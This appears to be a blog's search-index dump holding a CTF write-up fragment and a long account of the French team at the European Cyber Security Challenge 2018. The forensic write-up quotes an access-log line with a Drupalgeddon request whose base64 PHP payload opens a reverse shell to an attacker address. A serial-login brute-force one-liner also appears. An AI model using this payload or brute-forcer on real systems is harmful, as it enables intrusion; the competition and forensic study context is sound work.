Accept-Encoding: identity Host: 52.15.72.79:15462 Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 266 .___..___.___..__..___..___ __ . . _/ [__ | [__] | [__ / `|__| ./__.[___ | | | | [___\\__.| | :::: Admin Note :::: Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following generated password. :: IMTLD{Wh3r3_d03s_HuM4n1tY_3nd} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:4","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Writeups"],"content":"Flag IMTLD{Wh3r3_d03s_HuM4n1tY_3nd} ","date":"2018-12-19","objectID":"maki.bzh/writeups/santhacklaus2018netrunner/:3:5","tags":["santhacklaus","pinkflood","pentest","web","xxe","oob","sqli","ngrok"],"title":"[Santhacklaus 2018] - NetRunner","uri":"maki.bzh/writeups/santhacklaus2018netrunner/"},{"categories":["Posts"],"content":"Feedback on the European Cybersecurity Challenge. In 2018 this CTF were organise in London, French team ends the CTF with a second place.","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Introduction In this article, I’ll share the whole journey that lead me to this event, not just the CTF in itself. It is a totally subjective point of view, so the “jump to section” tool might come in handy if some parts seem useless to you. First of all, I’ll start by catching up on the “Nuit du Hack” event, where it all started for some of the members of the Apéri’Kube, Hexpresso and Inshall’hack teams. Then I’ll review our training with the ANSSI before the competition. Finally I’ll go over the ANSSI’s training platform and the trip to London for the European Cyber Security Challenge. Have fun ! :) Nuit du hack During the last “Nuit du Hack” (NDH) event, the Apéri’Kube team entered the public Wargame. During the day, the ANSSI was giving out small plastic cards talking about a national selection for a European CTF taking place in London. This selection was to take place during the NDH’s public Wargame. At that time, I personally made the choice to tuck the card at the bottom of my (full of goodies) bag and to concentrate on the Wargame, with the goal to beat the Hexpresso team :D Our team ended up finishing second on the final scoreboard! After discussing it with the Apéri’Kube team and our friends and relatives, 6 members of the team and I applied for the European Cyber Security Challenge. A few days later, I was contacted to establish a summary of the Apéri’Kube members that applied. Actually, to enter this CTF, the team needed to be made of : 5 members aged 14 to 20 5 members aged 21 to 25 3 substitutes In the end, the final list was released on the 6th of July 2018. It was made of : Antoxyde Areizen Chaign_c DrStache ENOENT Gnomino Iptior Kara Maki Nico (@dev2lead) Paul (from INSecurity) Sideway XeR We were invited the 10th and 11th of September to the ANSSI’s headquarters. ANSSIminaire The ANSSI welcomed us on the 10th and 11th of September to prepare for the event, but it was also the opportunity to meet and spend some time with the coaches. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:0:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Day 1 - Getting ready for the event Upon arrival, we all introduced ourselves. I had already met Antoxyde before, during the Insomni’hack’s CTF. We also met the coaches : Virtualabs Ack Heurs We also met the person in charge of being the link between us, the ANSSI and the ECSC’s organizing team. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:1:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Introducing the CTF After everyone’s introduction, the ANSSI introduced us the European Cyber Security Challenge and its history. This event has been organized for 6 year by the ENISA, an agency of the European Union in charge of its network and information security. At the beginning, it was an attack/defense CTF, with only a few countries (5 to 6). In 2017, 10 countries were invited, and 19 in 2018 ! The CTF type changed and became a jeopardy challenge, with additional strategic features. In the end, 2 of the countries out of 19 couldn’t make it, Luxembourg and Scotland. Indeed, to be part of a national team, the members must have the country’s nationality and none of theses 2 countries could build up a team in time. Another thing : each country gets to choose its recruitment process, the only conditions set up by the ENISA being the age of the team members, 5 aged 14 to 20 and 5 aged 21 to 25. The competition takes place during 2 days, between 10am and 6 pm roughly. The first day challenges are not available on the second day and vice-versa, so it is important to prioritize the challenges to complete throughout the day. Each country represents a cyber security company. The challenges take the form of contracts to execute : for each contract you finish, you earn a certain amount of money and reputation. At that time, we thought that the virtual currency system would be useful to unlock other contracts, exchange information, etc. Moreover, in the challenges’ synopsis the coaches received, blockchain was mentioned so we imagined we would deal with a local crypto-currency. In the end, the money was just a name for the points we earned, and the blockchain was used in a forensic challenge. The reputation would have been useful to unlock certain challenges, but in the end it was not used during the competition. The contracts are in fact a few challenges linked together with a scenario. For example, each first flag of a contract including archive files was the MD5 of the file. Then we would enter the real technical part of the challenge and end it by sending a small report. There were 3 types of special challenges. The first one consisted in an oral presentation of 10 minutes in English about one of the first day challenges. We could earn up to 60% of the points of said challenge. The second one was a 30 minutes escape game. Only 4 members of the team were allowed, including the captain. We didn’t know much about it, only that we maybe would have to pick locks. I’ll explain it in further details later on. The last one consisted in a “Boot2root” VM challenge : we had to become root as fast as possible. Those challenges were named “CTF1”, “CTF2”, etc. It was possible to earn points with the intermediate steps, but when a team would finish one of those, the challenge would disappear from the platform for everyone else. Finally, the ENISA didn’t specify anything concerning bringing a server bay or building a local network. Since we didn’t know if we would have an Internet access or not, it was an idea we brought up to the ANSSI. We were later told that we would have an Internet access, so we chose to build a remote infrastructure. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:1:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Day 2 - Level evaluating CTF On the second day, the ANSSI organized a small CTF. We were divided in 4 teams and spent the day solving challenges together. On the menu, forensic, crypto, reverse and DFIR challenges. I was in a team with Nico, Antoxyde and Sideway. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:2:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Forensic Among the challenges I could flag, there were 3 forensic challenges : Discovering Bob’s password : I just had to use the Mimikatz volatility plugin on the memory dump. A 3 challenges set about a malware : the first 2 challenges were about finding the register key and the malware’s mutex. A LUKS challenge, I forgot what exactly it was about. As far as I’m concerned, I had a lot of fun solving those challenges, even though I had to re-install my VM right in the middle because of a badass update that broke it all. Pro-tip : after a kernel update, don’t forget to reboot your machine to re-activate the drivers, like dm-crypt for cryptsetup… ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:2:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"DFIR The Digital Forensic Incident Response (DFIR) challenges were focused on websites that had been pwned. We had to understand how, re-exploit the vulnerability and write a small report that one of the coaches had to validate. Nico did that part. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:2:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Crypto The only challenge I looked up in that part was the malware one after the two forensic challenges. It used AES, and the vulnerability was in the AES CTR counter. Antoxyde did the rest, and he did good ! ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:2:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Others There were other challenges, for example the reverse ones, Sideway did wonders with them ! It was a good first experience of working together as part of the national team. At the end of the day, the coaches chose someone to be the team captain… and they chose me. I had mixed up feelings about it, between the “Yay I’m super proud” and the “Why me I’m gonna die”. My feelings at this moment Online training Right after the 2 days in Paris, the ANSSI opened up an online training platform, in addition to the Virtualabs and Heurs challenges. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:2:4","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Platform The challenges were slightly different, but I worked on the same types : forensic crypto, reverse, web and pwn. It was very interesting, I learned a few useful tricks like the Snappi one (you can find a similar challenge on my platform : https://ctf.maki.bzh). ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:3:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Personal As far as I’m concerned, I went on with my forensic learning and tried to rationalize my actions when facing certain types of files, instead of YOLOing my way through it and breaking my VMs down half of the time. I built a VM based on the “Tsurugi” Linux distribution (https://tsurugi-linux.org/), which was made by a colleague of mine (Openminded). It includes all the forensic tools, and allowed me to beta test this distribution while learning a bit more about forensic. I will soon write an other post about the methods I’m using in CTF, with little tips and tricks : stay tuned ! ECSC Event After all the preparations, it was time for the event to begin ! It started with a nice and cozy bromance evening at GlaCius’ place ❤ Booya ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:4:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Sunday With ENOENT and DrStache, we took the train from Vannes to Paris to join the rest of the team and board on the Eurostar. But when we arrived at the Gare du Nord, there was a ruckus caused by a bomb alert : what a way to start… After almost missing our train, we were finally on our way towards London. Upon arrival we headed to the CTF facility to set up our equipment, so that we could arrive the next morning and start right off without losing time. Afterwards, we went to the hotel : we were on the tenth story of a 4 stars with ENOENT, it was really cool. At the end of the day, all the countries were invited to watch the teams’ introduction videos. In the French one, we were represented by avatars. Big up to the Italians whose video was really funny, and to the Estonians with their Hackerman style. After the reception, Virtualabs presented us a few hardware, radio frequency and steganography techniques. We set up a CTF pad on my VPS. Which crashed during the night, and since I had set it on my 5000 port, it was blocked by the ECSC network anyway. Hence the lack of CTF platform, sorry guys. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:5:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Monday In the morning, we had access to a huge buffet : scrambled eggs, sausages, beans… When we finished stuffing our stomachs, we proceeded to register ourselves with the ECSC team. We finished setting up the place, and were on the starting blocks at 10am for the beginning of the CTF. We tried to organize ourselves according to our specialties : crypto guys next to the reverse guys, next to the forensic guys, etc., so that we could all communicate well. In the end, it didn’t really matter but it reassured us : we had a strategy… kind of. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:6:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"CTF - Day 1 As we were told, the strategic part with the balance between the money, the reputation and the contracts wasn’t a thing anymore. There was only one strategy : to flag as many things as fast as possible. We were told our rank for the Bandstand (escape game) when we arrived, as well as the one for the oral presentation. The teams had to go one after the other, we were scheduled Tuesday at 11h40am for the bandstand and at 3pm for the oral. After a quick glance, we noticed a lot of forensic challenges with heavy archives. After downloading them, we could see that they were in fact complete memory and disk dumps. For those challenges, there was no particular flag format, we just had to understand how the attacks were done and find the compromission’s hints as we studied the archives. We were in a bit of a rush, so my memory is a bit blurry, but I can remember a fun forensic challenge. Forensics There were different types of forensic challenges, one was about blockchains for example. We started the contract with a memory dump knowing that a fraudulent transaction had been completed. The first flags were really quite easy : Blockchain type Incriminated users names Finding the smartcontract This challenge was a fun one, Nico taught me lots of things about blockchains in general. In the end, we had to search for the emails in the memory dump and find the date of the fraudulent transaction. Lucky us, there was only one transaction this day, and we just had to hash it to get the flag. Other challenges were based on real attacks, like drupalgeddon, packed malwares… My personal analysis on the forensic challenges : they were much more realistic than other CTFs challenges, it was more like a real incident response in a CERT, not surreal puzzles. However, the lack of flag format really bothered us. Sometimes we would have the answer but since the flag was case-sensitive, it took us some time to enter it the right way. CTF 1 - Fair play you said? Around 11am, the first Boot2Root, “CTF1”, was released. DrStache and Nico got onto it immediately. The entry point was found by DrStache quite quickly, a classical Local File Include (LFI). After dumping the website resources, there was the PHP exec() function with an injectable parameter. The PHP function was in an “action.php” page, DrStach refreshed the page and… nothing. Error 404. We all try, but we got the same answer, and the Germans just next to us too. I forwarded the issue to the organizing team, they told me they would reboot the machine. I learned later on thanks to the coaches that it was part of the game. A few moments later, one team flagged the VM… Not very sporty to cut the entry points… Flag’em all The day went on, team France kept going. According to other coaches, we were the team that flagged the most during this first day. We ended up 4th, but the 3 first teams and the 2 behind us had already done the Bandstand. This challenge represented a huge amount of points at this moment of the competition. Just before the end of the day, we decided to start the Bandstand. The first challenge consisted in finding a digicode to unlock the escape game’s door. We had to empty a trash bag full of shredded paper to find it. Results of this first day : we almost finished the platform, with only two little challenges missing. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:6:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Restaurant We went to the “Giraffe” restaurant in London with all the teams. The mood was quite chill, but it wasn’t party time. Most of the teams didn’t mix up and stayed together. I ate a good old chicken burger, with a brownie and a scoop of ice cream. We had some time to sum up the day, and to get ready for the next one. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:6:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Getting ready for the next day During the evening, we spent some time preparing for the special challenges : the Bandstand and the oral presentation. Bandstand - Finding the code Back to the hotel, everyone was busy cracking the code (except Nico, Gnomino, XeR and myself as we were preparing for the oral). Among the shredded papers, there were multiple grids with letters in them (12, including the one with the digicode for the door), letters and a file with many 8 letters words in it (11 were crossed). Analyzing the letters, we could find which word was linked to which grid. The guys then deduced the pin codes. ENOENT noticed that the pin codes were linked to a rotation, for example : 12345678 23456781 34567812 It was then possible to deduce the pin and password thanks to the Sideway’s code : import hashlib letters = \"PQIOCFTHAXDSWEJMLYRGZ\".lower() # migrated # https://raw.githubusercontent.com/dwyl/english-words/master/words_alpha.txt wordlist = open(\"./words_alpha.txt\", \"r\").read().split(\"\\n\") grid = \"1234567890#0987654321\" for w in wordlist: if len(w) == 8 and w[-1] == 'd': if all([i in letters for i in w]): # if len(set(w)) == len(w): print(w + \" / \" + ''.join([grid[letters.index(j)] for j in w])) In the end, the door’s code was : 630741# Oral presentation The four of us worked on the oral presentation. Virtualabs took advantage of the day to prepare a template with France’s colors. We all agreed that we had to do a more commercial presentation, since each team was supposed to be a cyber security firm. The challenge we chose was the one with the most points we flagged : the “Examplia Forensics - Linux [ENISAForensics1a]” worth 17,000 points. [Writeup] Examplia Forensics - Linux [ENISAForensics1a] Before getting to the oral presentation in itself, I’ll get over the challenges in this contract. If I remember well, almost everyone on the team worked on it at one point or another. First of all, we began with a zip archive : Lmarmedforces.ovf : a VirtualBox virtual machine OVF descriptor Lmarmedforces.mf : a manifest file containing the SHA1 hashes of the OVF and VMDK files Lmarmedforces-disk1.vmdk : a disk image of the compromised machine linux_memory.vmem : a memory dump of the compromised machine A visitor with an Agenda The first part was about finding the attacker’s entry point. The client thought he went through his CMS: Drupal. After a bit of research, we found something interesting in the acces.log file : $ grep eval /var/log/apache2/access.log 192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] \"GET /cfdocs/expeval/displayopenedfile.cfm HTTP/1.1\" 404 10134 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000942)\" 192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] \"GET /cfdocs/expeval/sendmail.cfm HTTP/1.1\" 404 10080 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000943)\" 192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] \"GET /cfdocs/snippets/evaluate.cfm HTTP/1.1\" 404 10087 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001012)\" 192.168.124.169 - - [23/Aug/2018:00:02:06 +0300] \"GET /contrib/forms/evaluation/C_FormEvaluation.class.php?GLOBALS[fileroot]=http://cirt.net/rfiinc.txt? HTTP/1.1\" 404 10301 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004564)\" 192.168.124.171 - - [23/Aug/2018:23:50:56 +0300] \"POST /?q=user/password\u0026name%5b%23post_render%5d%5b%5d=assert\u0026name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMTI0LjE3MSc7ICRwb3J0ID0gNDU2NzsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOy","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:6:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Tuesday Wakey wakey ! A huge English breakfast to be ready for the day, our bags to pack and our teethes to brush : let’s head towards the competition’s room ! ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"CTF - Day 2 We arrived a bit early, like yesterday, switched on our machines and waited until 10am to begin the second day of the CTF. Since I knew there would be a hardware challenge this day, I decided to begin with it. I had to keep in mind that XeR, Paul, Chaign_c and I had to do the Bandstand at 11h40 am. For this hardware challenge, the organizing team gave us all the necessary supplies : Arduino nano USB \u003c-\u003e UART adaptater 4 cables Since I’ve already worked on Arduino, I wanted to do a firmware dump with avrdude. To try this, no matter the Arduino model, just push a code that prints on one serial port. Once the Arduino is programmed, plug it to your machine via USB while pushing the RESET button. Then it is possible to get the content of the flash memory thanks to this command : $ avrdude -p m328p -c arduino -P /dev/ttyACM0 -b 115200 -U flash:r:flash_raw.bin:r Of course, it didn’t work. Indeed, it is impossible to communicate with those ports if the debug fuses are grilled. We would have needed a specific Atmel programmer to get the memory : this is what the Italian team have done. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:1","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Bandstand - “Escape game” 11h40 am : beginning of the Bandstand. We arrived with the code we found the previous day, hoping not to loose time and that the door would opens right away. And that is what happened ! GG to all of those who worked on it. Room description We arrived in a little room of about 4m². At first glance, we noticed some interesting things (it was easier if you had entered an Escape Game before) : am alarm was ringing a vest was hanging on the wall, right next to the door a big toolbox, sealed with 4 digits lockets on each side was resting on a little and high table At the bottom of this table, another smaller toolbox, with only one locket (that opened with a key) Challenge 1 \u0026 2 The first challenge was the door code. The second one consisted in deactivating the alarm. Having already entered an Escape Game before, I immediately searched the vest. I found a lock picking kit (it would be useful for the third challenge). Under the vest, we found the alarm. Under it were written three 4 digits codes. We got to witness XeR’s genius for the first time : after looking at it for about 5 seconds he just deactivated the alarm. The codes looked like something like this : 2145 7577 2909 Those aren’t the exact codes, I don’t remember them. But they were also sequences of numbers. Challenge 3 Second genius episode : thanks to the lock picking kit, XeR unlocked the smaller box. We accessed different things : 4 pairs of wire-cutters a “blank” sheet 2 UV lamps 2 electronic connectors 1 screwdrivers’ box Challenge 4 It was the challenge that took us the longest to achieve. The “blank” sheet wasn’t in fact as empty as it seemed. 4 enigmas were written on it with invisible ink, we were able to read them thanks to the UV lamps. If a 3 inches cube is painted red, that we cut 1 inch cubes in the big cube and throw them, what is the probability that the upper faces are red ? How many letters are there in the missing color to make a rainbow : red, yellow, green, blue, indigo and purple ? How many chimneys had the Titanic ? In a range from 1 to 1000, which is the least used number ? First, we split : Chaign_c and I thought about the questions while Paul and XeR tried to bruteforce the code. The missing color was “orange”, so the second number was 6. I found that the last number was 0. With 2 missing numbers, the bruteforce was taking too long. Paul was still thinking : a probability can only be between 0 and 1 ! Given the question, the answer had to be 0. We bruteforced the last digit : the Titanic had 4 chimneys . The code was : 0640 Game was on ! Challenge 5 When opening the box, we saw 5 inox plates screwed in a cross shape : After unscrewing the plates, we found 4 little male connectors numbered from 1 to 4. I got it pretty fast : we had to plug the connectors to the center. Once plugged in, the integrated LEDs started to shine. In the other compartments (in purple on the picture), there were plenty of different wires with little numbers. The link between the LEDs and the wires’ colors and their numbers was obvious. Moreover, in the toolbox we had opened, there were 4 pairs of wire cutters… So with the 4 of us, 4 compartments, 4 wire cutters, and wires colored given the LED they went with… We had to cut ! At this moment, the game master informed us that normally, a voice was supposed to tell us that the wires had to be cut simultaneously, but it didn’t work at the moment. After a “1, 2, 3, GO”, cutting at “GO” to be synchronous, we finished the Bandstand. We solved it all in 19 minutes, making us the fastest group in all of the 6 previous ECSC’s editions ! ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:2","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Back to the CTF Upon returning to the CTF room, we dropped the news to the team, and resumed with the CTF. They kept going during our absence. As soon as he got to his computer, XeR entered all the Bandstand’s flags : we were first again ! Hardware challenge I started working on the hardware challenge again. After my failure with the flash dump, I was asking myself if the UART was on the right pins. I also asked the organizing team to check if I hadn’t burned the Arduino card during my tests. The Arduino was fully functional so I asked if it was possible to change the UART default pins. I was told that they didn’t know but it seemed like a good hypothesis. I felt that I was on the right track, so I started to bruteforce the pins to find the transmission one (Tx - Transmitter), waiting for something to pop up on my picocom. On the D11 pin, I had something ! Something terribly ugly, but something. Non printable characters meant that I was using the wrong baud rate. I used the default baud value for the Arduino (115,200), but after a quick baud bruteforce, I changed it to 38, 400 baud. The picocom was asking me for a login, hurray ! Now I had to find the reception pin of the card (Rx - Receiver). I did the same thing again, but this time I knew I had the right one when what I wrote showed up on the picocom’s prompt. The right pin was the D4. In the script, it was clearly stated that we had to find both the login and the password. We tried a few classical credentials like : root:root, admin:admin, root:toor… But nothing. I asked Paul to develop a bruteforcer and he came up with a magnificent one-liner bash : $ sleep 1s \u0026\u0026 cat pass.txt | sed -e 's/^/root\\n/g' | while read -r line; do xdotool type \"$line\" \u0026\u0026 xdotool key Return \u0026\u0026 echo \"$line\" \u0026\u0026 sleep 1s; done In the end, he ended up trying another credential, and it worked : root:admin So : $ sudo picocom -b 38400 /dev/ttyUSB0 [...] Login: root Password: admin Flag Other challenges The whole team kept flagging while we were away, we were second and got the first place thanks to the hardware challenge ! We were overjoyed ! The ANSSI’s general director, Guillaume Poupard, paid us a visit to support us and to take a few pictures. When he arrived, we were first, but not from afar. We then went to the second place, and just after he left, first again… During the day, new “CTF1” and “CTF2” came up, each time we succeeded in finding the entry point but each time another team turned it off, making it impossible for the other teams to keep solving the challenge. I worked on a forensic challenge : on a pcap, there was a lot of malicious traffic via RDP. We had to find which protocol had been used, which IP addresses were impacted, the attacker’s IP address… A lot of guessing for this challenge. Nico and Gnomino did the oral presentation of the forensic challenge and it seemed to have gone well. We couldn’t know for sure until the end of the day. In the mean time, ENOENT, XeR and Antoxyde finished up the crypto challenges, Sideway did some reverse and stegano with Gnomino, Paul finished a whole forensic contract, DrStache and Nico were on a huge contract about an Active Directory and Chaign_c worked on some pwn, reverse and forensic, where he was needed. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:3","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Final countdown The last hour : we were first and intended to keep it that way ! Apparently, the Bandstand allowed us to be first, even if we had some minor things left to flag on the platform. We thought we had already won… But 45 minutes before the end, the “CTF3” came up. The 3 challenges’ contract was worth 12,000 points. If one of the 5 first teams finished it, it would be first with no possibilities for the others to get by. The whole team worked hard on it, we all searched and we found the entry point. DrStache found an injection in the PHP template : when sending {7*7}, it answered correctly 49. We searched a way to inject a command… And at the worst time, the entry point was shut off. I ran (everybody that really knows me won’t believe it), to ask he organizing team to restart the machine. Finally, the German exulted with joy, they got the first place 20 minutes before the end, only 2,000 points before us. The CTF was getting to an end, we hoped the oral would lift us to the first place, but the German team chose the same subject and we both had the maximum number of points. France’s team ended up second on this first time entering the challenge, but we were a little bitter because we really thought we had it. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:4","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"End of the CTF There was an end speech, thanking the organizing team, the coaches and the participants of each country. It was finally over and we went to the social event organized on the building’s roof. On the menu, vegetarian burger, 5 different beers with unlimited refill and a lot of exchange with the other teams. It was a really nice event, the Belgians organized a beer contest, we laughed a lot. We talked with the Greeks and the Germans about the CTF and other subjects. Finally, the party was over. It was time to get back to the hotel to have a last drink before getting to bed and go visit London in the morning. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:7:5","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Wednesday We slept in the morning of this last day in London. We got up at 8am, had breakfast and left around 10h30 am to visit Camden Market. For certain members of the team, the event had been “complicated” and some preferred to stay in and rest. We enjoyed London and the market, it was really chill. Lunch time, we were hungry. It started raining so we found a burger restaurant… Vegan. No choice. In the end, it was really good. Around 3pm, we split in two groups, some of us went back to the hotel to rest before the evening, and some of us went to see Big Ben. After getting back to my room, I took a shower and we watched a few “Peepoodoo” episodes with ENOENT. Around 5pm we had to move and go to the closing ceremony. It was organized on a boat, it was really nice When the boat left, we saw the Tower Bridge open just for us, it was really impressive. Then the evening started and we had something to eat, along with two drinks. Finally, the organizing team began to speak. There was a whole speech on the event in itself, they thanked the sponsors and then ended with the prizes. The podium was : Germany (179,350 pts) France (177,050 pts) United Kingdom (169,950 pts) The first prize was really interesting, the two others less appealing. 1st place : Tickets for any Black Hat for the whole team, and if they choose the EU Black Hat it comes with transportation and sleeping commodities. 2nd place : 500 pounds for the whole team. 3rd place : 250 pounds for the whole team. The party kept going on, we laughed and enjoyed this last event. When we went back to the hotel, some of us went to bed, some tried hard on the hack.lu CTF and some others kept partying with the Italians ! I chose to call my girlfriend to kiss her good night before going to bed. Conclusion To sum all this long blog post up, it was a really, really, really awesome adventure. It allowed me to judge the European level, be it our personal or France’s team level, but most of all to meet great people, be it the coaches air the other members of our team. I want to say a huge, huge “thank you” to the member of the ANSSI that allowed us to take part in such an event, he was really nice and supportive. Regarding the CTF, some aspects need to be upgraded, mostly formatting the flags and banishing the anti-game gameplay. But those are details. Concerning France, we could see what the event was like, we were like “crash tests” but we ended up doing not so bad. Next year, we will see how the ANSSI organizes the recruitment of the French team and of the coaches. A sure thing : I would gladly go to Romania to represent France ! Hoping to meet everybody again soon, to share a moment and a good beer ! Thank you for reading the whole post, I hope it wasn’t too long and that you enjoyed it. If you have questions, whatever it is, I’m on Twitter, LinkedIn, mail, whatever :) Kisses ❤ Writeups Je vais présenter les writeups un peu “en vrac”, c’est un peu difficile de savoir quel contrat correspond à quel jour en fonction de qui à fait quoi. Donc les titres vont avoir la forme suivante: I will do the writeups, but it is a bit messy, it is difficult to remember which contract matches with which day, and to know who did what. So the challenges’ tittle will have this format : [Nom du chall] - [Catégorie]. ","date":"2018-11-24","objectID":"maki.bzh/feedbackecsc2018/:8:0","tags":["ecsc","anssi","ctf","london","feedback","maki life","goodies"],"title":"Feeback of European CyberSecurity Challenge 2018 final CTF","uri":"maki.bzh/feedbackecsc2018/"},{"categories":["Posts"],"content":"Ma Baker - Reverse This challenge is composed of two main 